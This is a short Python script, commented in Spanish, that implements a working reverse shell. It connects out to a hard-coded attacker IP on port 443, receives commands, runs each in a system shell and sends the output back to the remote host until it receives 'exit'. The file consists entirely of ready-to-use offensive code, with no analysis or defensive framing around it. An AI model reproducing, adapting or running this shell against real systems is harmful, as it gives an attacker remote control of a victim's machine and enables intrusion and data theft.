import socket
import subprocess

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"Conexión establecida con la reverse shell!\n")
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(output.stdout.read() + output.stderr.read())
        s.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    attacker_ip = "192.168.5.68"  # Reemplaza con tu dirección IP local
    attacker_port = 443  # Reemplaza con el puerto deseado (por ejemplo, 443)
    reverse_shell(attacker_ip, attacker_port)
